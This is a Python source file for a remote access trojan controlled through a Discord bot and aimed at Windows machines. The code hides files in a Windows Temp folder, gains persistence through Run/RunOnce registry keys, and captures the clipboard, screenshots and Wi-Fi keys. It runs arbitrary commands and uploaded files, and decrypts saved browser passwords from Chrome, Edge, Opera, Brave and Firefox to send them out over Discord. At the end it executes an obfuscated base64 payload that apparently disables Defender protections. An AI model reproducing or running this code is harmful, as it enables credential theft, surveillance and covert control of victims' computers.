import discord
from discord.ext import commands
import base64
import time
import datetime
import os 
import subprocess
import winreg
import sys

from Crypto.Cipher import AES
from datetime import datetime as dt, timedelta
import pyperclip
from PIL import ImageGrab
import psutil
import shutil
import win32crypt
import sqlite3
import json
import re
import ctypes


bot = commands.Bot(command_prefix='-', intents=discord.Intents.all())

name = os.getlogin()
date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

path = "C:\\Windows\\Temp\\wsappx"
date_screenshot = f"C:\\Windows\\Temp\\wsappx\\dll\\{date}.png"
cmd_path = "C:\\Windows\\Temp\\wsappx\\command\\cmd.txt"
wifi_path = "C:\\Windows\\Temp\\wsappx\\command\\wifi.txt"
clipboard_path = "C:\\Windows\\Temp\\wsappx\\command\\clipboard.txt"

async def ScreenshotSend(ctx, ss_path):
    await ctx.send(file=discord.File(ss_path))

async def CmdSend(ctx,cmd_path):
    await ctx.send("Command : " + "\n" + cmd_path)

async def PasswordSend(ctx):
    os.chdir(r"C:\Windows\Temp\wsappx\data")
    await ctx.send(file=discord.File(f"{os.getlogin()}-şifreler.txt"))

async def WifiSend(ctx):
    await ctx.send(file=discord.File(wifi_path))


def query():
    os.chdir("C:\\Windows\\Temp")
    if not os.path.exists("wsappx"):     
        try:
            os.makedirs("wsappx")
        except FileExistsError:
            pass
    if not os.path.exists("./wsappx/command"):     
        try:
            os.makedirs("./wsappx/command")
        except FileExistsError:
            pass
    if not os.path.exists("./wsappx/dll"):     
        try:
            os.makedirs("./wsappx/dll")
        except FileExistsError:
            pass
    if not os.path.exists("./wsappx/data"):     
        try:
            os.makedirs("./wsappx/data")
        except FileExistsError:
            pass
query()



def addstartup():
    fp = os.path.dirname(os.path.realpath(sys.argv[0]))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = os.path.join(fp, file_name)
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key2change, "wsappx", 0, winreg.REG_SZ, new_file_path)

    fp3 = os.path.dirname(os.path.realpath(sys.argv[0]))
    file_name3 = sys.argv[0].split("\\")[-1]
    new_file_path3 = os.path.join(fp3, file_name3)
    keyVal3 = r'Software\Microsoft\Windows\CurrentVersion\RunOnce'
    key2change3 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal3, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key2change3, "wsappx", 0, winreg.REG_SZ, new_file_path3)
    try:
        fp1 = os.path.dirname(os.path.realpath(sys.argv[0]))
        file_name1 = sys.argv[0].split("\\")[-1]
        new_file_path1 = os.path.join(fp1, file_name1)
        keyVal1 = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change1 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, keyVal1, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key2change1, "wsappx", 0, winreg.REG_SZ, new_file_path1)
        fp2 = os.path.dirname(os.path.realpath(sys.argv[0]))

        file_name2 = sys.argv[0].split("\\")[-1]
        new_file_path2 = os.path.join(fp2, file_name2)
        keyVal2 = r'Software\Microsoft\Windows\CurrentVersion\RunOnce'
        key2change2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, keyVal2, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key2change2, "wsappx", 0, winreg.REG_SZ, new_file_path2)
    except:
        pass
addstartup()




#Data
@bot.command()
async def info(ctx):
    global name
    data = {
        "title": f"{name} Makina Açıldı",
        "description": """
**Datas:**
-clipboard
-screenshot
-wifi
-password

**Upload**
-upload **[Not for single use]**
-execute **[Not for single use]**
-cmd **[Not for single use]**
-download **[Not for single use]**

**File Operations**
-back
-ls
-cd

**Machine Information**
-hardware

**Entertainment Commands**
-error **[Not for single use]**
""" 
    }
    embed = discord.Embed(title=data["title"], description=data["description"], color=0x00E1FF)  # Renk değerini 16'lık sistemle ayarlayın

    await ctx.send(embed=embed) 

@bot.command()
async def clipboard(ctx):
    await ctx.send(pyperclip.paste())
        
@bot.command()
async def screenshot(ctx):
    date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") 
    img = ImageGrab.grab()
    date_screenshot = f"C:\\Windows\\Temp\\wsappx\\dll\\{date}.png" 
    img.save(date_screenshot)
    time.sleep(1)   

    screenshot_channel = ctx.guild.get_channel(1166774603604050002)  # Add the ID of the channel you want to send screenshots to on Discord

    if screenshot_channel:
        await screenshot_channel.send(file=discord.File(date_screenshot))
    else:
        await ctx.send("Belirtilen kanal bulunamadı.")

    await ScreenshotSend(ctx, date_screenshot)

@bot.command()
async def wifi(ctx):
    with open(wifi_path, "a") as wifi_file:
        wifi_list = []
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
        profile_names = re.findall("All User Profile     : (.*)\r", command_output)
        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    pass
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password.group(1)
                    wifi_list.append(wifi_profile)
                    wifi_file.write(str(wifi_profile) + "\n")
                    await WifiSend(ctx)


#Upload Execute and Download
@bot.command()
async def upload(ctx, dosya_adı):
    kaydetme_dizini = ""       
    await ctx.send(':file_folder: ** Please send the file.**')
    response = await bot.wait_for('message', check=lambda message: message.author == ctx.author)
    if response.attachments:
        attachment = response.attachments[0]
        file_name = os.path.join(kaydetme_dizini, dosya_adı)  # Dosyanın tam yolu
        await attachment.save(fp=file_name)
        await ctx.send(f':white_check_mark: **{attachment.filename} başarıyla kaydedildi.**')

@bot.command()
async def execute(ctx, filename):
    working_directory = ""
    
    filepath = os.path.join('/'.join(working_directory), filename)  
    if os.path.exists(filepath):
        try:
            subprocess.run(['start', filepath], shell=True)
            await ctx.send('Successfully implemented: {}'.format(filename))
        except Exception as e:
            await ctx.send(f'❗ Something went wrong.``\n{str(e)}')
    else:
        await ctx.send('❗ File or directory not found.')
    

@bot.command()
async def cmd(ctx, *, command=None):
    if ctx.channel.name == 'execute':
        if command is None:
            ctx.send("Use && to execute more than one command")
        else:
            result = subprocess.run([command] ,shell=True, capture_output=True, text=True)
            with open(cmd_path , "w") as cmd_output:
                cmd_output.write(result.stdout)
            await CmdSend(ctx ,cmd_path)

@bot.command()
async def download(ctx , * , path=None):
    if path is None:
        ctx.send("Please Specify an Index...")
    else:
        await ctx.send(file=discord.File(path))


#File Operations
@bot.command()
async def back(ctx):
    current_directory = os.getcwd()

    # Bir üst dizine geç
    parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
    try:
        os.chdir(parent_directory)
        await ctx.send(f'Current directory: {parent_directory}')
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command()
async def ls(ctx):
    current_directory = os.getcwd()
    try:
        contents = os.listdir(current_directory)
        file_list = [item for item in contents if os.path.isfile(item)]
        folder_list = [item for item in contents if os.path.isdir(item)]

        response = f':file_cabinet: Files: {", ".join(file_list)}\n:file_folder: Folders: {", ".join(folder_list)}\n:round_pushpin: File Location: {os.getcwd()}'
        await ctx.send(response)
    except Exception as e:
        await ctx.send(f'Hata oluştu: {e}')      

@bot.command()
async def cd(ctx, *, klasor_yolu):
    try:
        # Kullanıcı tarafından belirtilen klasöre geç
        os.chdir(klasor_yolu)
        await ctx.send(f'Currently the directory: {os.getcwd()}')  # Yeni dizin yolu kullanıcıya iletilir
    except Exception as e:
        await ctx.send(f'Error: {e}')


#Machine info
@bot.command()
async def hardware(ctx):
    message = ""
    message += f":pager: CPU: *{psutil.cpu_count()}* cores\n"
    message += f":dvd: RAM: *{psutil.virtual_memory().total / (1024.0 ** 3)}* GB\n"
    message += f":floppy_disk: Hard disk: *{psutil.disk_usage('/').total / (1024.0 ** 3)}* GB\n"
    message += f":file_folder: Boot device: {psutil.disk_partitions()[0].device}"
    await ctx.send(f"System Specifications **{os.getlogin()}**: \n\n{message}")

#Funny
@bot.command()
async def error(ctx, * , message=None):
    if message is None:
        await ctx.send("Please enter message...")
    else:
        ctypes.windll.user32.MessageBoxW(None, f'Error code: 0x80070002\n{message}', 'Fatal Error', 0)

#Password 
try:
    @bot.command()
    async def password(ctx): 
        file_path = save_credentials_as_file(steal_passwords())
        try:
            await ctx.send(f":hourglass:Passwords Withdrawn Machine Name: **{os.getlogin()}**")
            with open(file_path, "r", encoding="utf8") as file:
                file_data = discord.File(file, filename="stolen_credentials.txt")
            await PasswordSend(ctx)
        except Exception as e:
            await ctx.send(f"Şifreler Alınamadı **{os.getlogin()}**: {e}")
            return
        await ctx.send(f":white_check_mark: Grabbed **{os.getlogin()}**'s passwords", file=file_data)

    def my_chrome_datetime(time_in_mseconds):
        return dt(1601, 1, 1) + timedelta(microseconds=int(time_in_mseconds))

    def encryption_key(browser):
        localState_path = None
        if browser == "Chrome":
            localState_path = os.path.join(os.environ["USERPROFILE"],
                                           "AppData", "Local", "Google", "Chrome",
                                           "User Data", "Local State")
        elif browser == "Edge":
            localState_path = os.path.join(os.environ["USERPROFILE"],
                                           "AppData", "Local", "Microsoft", "Edge",
                                           "User Data", "Local State")
        elif browser == "Opera GX":
            localState_path = os.path.join(os.environ["APPDATA"],
                                           "Opera Software", "Opera GX Stable",
                                           "Local State")
        elif browser == "Opera":
            localState_path = os.path.join(os.environ["APPDATA"],
                                           "Opera Software", "Opera Stable",
                                           "Local State")
        elif browser == "Brave":
            localState_path = os.path.join(os.environ["LOCALAPPDATA"],
                                           "BraveSoftware", "Brave-Browser",
                                           "User Data", "Local State")

        with open(localState_path, "r", encoding="utf-8") as file:
            local_state_file = file.read()
            local_state_file = json.loads(local_state_file)

        ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decrypted key

    def decrypt_password(enc_password, key, browser):
        try:
            init_vector = enc_password[3:15]
            enc_password = enc_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, init_vector)
            return cipher.decrypt(enc_password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1])
            except:
                return "No passwords available (logged in with social account)"

    def steal_chrome_passwords():
        password_db_path = []

        if os.path.exists(f"{os.getenv('userprofile')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"):
            password_db_path.append(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"))
        else:
            return {}

        for file in os.listdir(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")):
            if file.startswith("Profile"):
                profile_number = file
                password_db_path.append(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", profile_number, "Login Data"))

        all_data = {}

        for password_path in password_db_path:
            shutil.copyfile(password_path, "my_chrome_data.db")
            db = sqlite3.connect("my_chrome_data.db")
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            encp_key = encryption_key("Chrome")
            data = {}
            for row in cursor.fetchall():
                try:
                    site_url = row[0]
                    username = row[1]
                    password = decrypt_password(row[2], encp_key, "Chrome")
                    date_created = row[3]
                    if username or password:
                        if site_url not in data:
                            data[site_url] = []
                        data[site_url].append(
                            {
                                "username": username,
                                "password": password,
                                "date_created": str(my_chrome_datetime(date_created)),
                            }
                        )
                except: pass
            cursor.close()
            db.close()
            os.remove("my_chrome_data.db")

            all_data.update(data)

        return all_data

    def steal_firefox_passwords():
        if not os.path.exists(os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")):
            return {}

        profiles = os.listdir(os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles"))
        stolen_data = {}

        for profile in profiles:
            if profile.endswith(".default"):
                logins_path = os.path.join(os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles"), profile, "logins.json")
                if os.path.isfile(logins_path):
                    try:
                        with open(logins_path, "r", encoding="utf-8") as file:
                            logins_data = json.load(file)
                            for login in logins_data["logins"]:
                                site_url = login["hostname"]
                                username = login["username"]
                                password = login["password"]
                                date_created = login["timeCreated"]
                                if username or password:
                                    if site_url not in stolen_data:
                                        stolen_data[site_url] = []
                                    stolen_data[site_url].append(
                                        {
                                            "username": username,
                                            "password": password,
                                            "date_created": str(my_chrome_datetime(date_created)),
                                        }
                                    )
                    except: pass
        return stolen_data

    def steal_edge_passwords():

        if not os.path.exists(os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "Login Data")):
            return {}

        encp_key = encryption_key("Edge") 

        shutil.copyfile(os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "Login Data"), "my_edge_data.db")
        db = sqlite3.connect("my_edge_data.db")
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        data = {}
        for row in cursor.fetchall():
            try:
                site_url = row[0]
                username = row[1]
                password = decrypt_password(row[2], encp_key, "Edge")
                date_created = row[3]
                if username or password:
                    if site_url not in data:
                        data[site_url] = []
                    data[site_url].append(
                        {
                            "username": username,
                            "password": password,
                            "date_created": str(my_chrome_datetime(date_created)),
                        }
                    )
            except: pass
        cursor.close()
        db.close()
        os.remove("my_edge_data.db")
        return data

    def steal_opera_gx_passwords():

        if not os.path.exists(f'{os.getenv("APPDATA")}\\Opera Software\\Opera GX Stable\\Login Data'):
            return {}

        encp_key = encryption_key("Opera GX")

        shutil.copyfile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable", "Login Data"), "my_opera_data.db")
        db = sqlite3.connect("my_opera_data.db")
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        data = {}
        for row in cursor.fetchall():
            try:
                site_url = row[0]
                username = row[1]
                password = decrypt_password(row[2], encp_key, "Opera")
                date_created = row[3]
                if username or password:
                    if site_url not in data:
                        data[site_url] = []
                    data[site_url].append(
                        {
                            "username": username,
                            "password": password,
                            "date_created": str(my_chrome_datetime(date_created)),
                        }
                    )
            except: pass
        cursor.close()
        db.close()
        os.remove("my_opera_data.db")
        return data

    def steal_brave_passwords():
        if not os.path.exists(os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")):
            return {}

        encp_key = encryption_key("Brave")

        shutil.copyfile(os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"), "my_brave_data.db")
        db = sqlite3.connect("my_brave_data.db")
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        data = {}
        for row in cursor.fetchall():
            try:
                site_url = row[0]
                username = row[1]
                password = decrypt_password(row[2], encp_key, "Brave")
                date_created = row[3]
                if username or password:
                    if site_url not in data:
                        data[site_url] = []
                    data[site_url].append(
                        {
                            "username": username,
                            "password": password,
                            "date_created": str(my_chrome_datetime(date_created)),
                        }
                    )
            except: pass
        cursor.close()
        db.close()
        os.remove("my_brave_data.db")
        return data

    def steal_opera_passwords():
        if not os.path.exists(f'{os.getenv("APPDATA")}\\Opera Software\\Opera Stable\\Login Data'):
            return {}

        encp_key = encryption_key("Opera")

        shutil.copyfile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable", "Login Data"), "my_opera_data.db")
        db = sqlite3.connect("my_opera_data.db")
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        data = {}
        for row in cursor.fetchall():
            try:
                site_url = row[0]
                username = row[1]
                password = decrypt_password(row[2], encp_key, "Opera")
                date_created = row[3]
                if username or password:
                    if site_url not in data:
                        data[site_url] = []
                    data[site_url].append(
                        {
                            "username": username,
                            "password": password,
                            "date_created": str(my_chrome_datetime(date_created)),
                        }
                    )
            except: pass
        cursor.close()
        db.close()
        os.remove("my_opera_data.db")
        return data

    def steal_passwords():
        chrome_data = steal_chrome_passwords()
        firefox_data = steal_firefox_passwords()
        edge_data = steal_edge_passwords()
        operagx_data = steal_opera_gx_passwords()
        opera_data = steal_opera_passwords()
        brave_data = steal_brave_passwords()

        combined_data = {**chrome_data, **firefox_data, **edge_data, **operagx_data, **opera_data, **brave_data}

        if len(combined_data) > 0:
            return combined_data
        else:
            return {}

    def save_credentials_as_file(credentials_data):
        os.chdir(r"C:\Windows\Temp\wsappx\data")
        filename = f"{os.getlogin()}-şifreler.txt"
        with open(filename, "w", encoding="utf8") as file:
            for site_url, credentials_list in credentials_data.items():
                file.write(f"Sites URL: {site_url}\n")
                for credentials in credentials_list:
                    file.write(f"User Name: {credentials['username']}\n")
                    file.write(f"Password: {credentials['password']}\n")
                    file.write(f"Creation Date: {credentials['date_created']}\n")
                file.write("\n")
        return filename
except:
    pass

        



defender_file = "ZGVmIGRlZmVuZGVyKCk6CiAgICB0cnk6CiAgICAgICAgY21kID0gYmFzZTY0LmI2NGRlY29kZShiJ2NHOTNaWEp6YUdWc2JDNWxlR1VnVTJWMExVMXdVSEpsWm1WeVpXNWpaU0F0UkdsellXSnNaVWx1ZEhKMWMybHZibEJ5WlhabGJuUnBiMjVUZVhOMFpXMGdKSFJ5ZFdVZ0xVUnBjMkZpYkdWSlQwRldVSEp2ZEdWamRHbHZiaUFrZEhKMVpTQXRSR2x6WVdKc1pWSmxZV3gwYVcxbFRXOXVhWFJ2Y21sdVp5QWtkSEoxWlNBdFJHbHpZV0pzWlZOamNtbHdkRk5qWVc1dWFXNW5JQ1IwY25WbElDMUZibUZpYkdWRGIyNTBjbTlzYkdWa1JtOXNaR1Z5UVdOalpYTnpJRVJwYzJGaWJHVmtJQzFGYm1GaWJHVk9aWFIzYjNKclVISnZkR1ZqZEdsdmJpQkJkV1JwZEUxdlpHVWdMVVp2Y21ObElDMU5RVkJUVW1Wd2IzSjBhVzVuSUVScGMyRmliR1ZrSUMxVGRXSnRhWFJUWVcxd2JHVnpRMjl1YzJWdWRDQk9aWFpsY2xObGJtUWdKaVlnY0c5M1pYSnphR1ZzYkNCVFpYUXRUWEJRY21WbVpYSmxibU5sSUMxVGRXSnRhWFJUWVcxd2JHVnpRMjl1YzJWdWRDQXlJQ1lnY0c5M1pYSnphR1ZzYkM1bGVHVWdMV2x1Y0hWMFptOXliV0YwSUc1dmJtVWdMVzkxZEhCMWRHWnZjbTFoZENCdWIyNWxJQzFPYjI1SmJuUmxjbUZqZEdsMlpTQXRRMjl0YldGdVpDQWlRV1JrTFUxd1VISmxabVZ5Wlc1alpTQXRSWGhqYkhWemFXOXVVR0YwYUNBbFZWTkZVbEJTVDBaSlRFVWxYRUZ3Y0VSaGRHRWlJQ1lnY0c5M1pYSnphR1ZzYkM1bGVHVWdMV2x1Y0hWMFptOXliV0YwSUc1dmJtVWdMVzkxZEhCMWRHWnZjbTFoZENCdWIyNWxJQzFPYjI1SmJuUmxjbUZqZEdsMlpTQXRRMjl0YldGdVpDQWlRV1JrTFUxd1VISmxabVZ5Wlc1alpTQXRSWGhqYkhWemFXOXVVR0YwYUNBbFZWTkZVbEJTVDBaSlRFVWxYRXh2WTJGc0lpQW1JSEJ2ZDJWeWMyaGxiR3d1WlhobElDMWpiMjF0WVc1a0lDSlRaWFF0VFhCUWNtVm1aWEpsYm1ObElDMUZlR05zZFhOcGIyNUZlSFJsYm5OcGIyNGdKeTVsZUdVbklpQUsnKS5kZWNvZGUoKQogICAgICAgIHN1YnByb2Nlc3MucnVuKGNtZCwgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmRlZmVuZGVyKCkK"
exec(base64.b64decode(defender_file))

#Your Bot Token
if __name__ == "__main__":
    bot.run("YOURBORTOKEN")

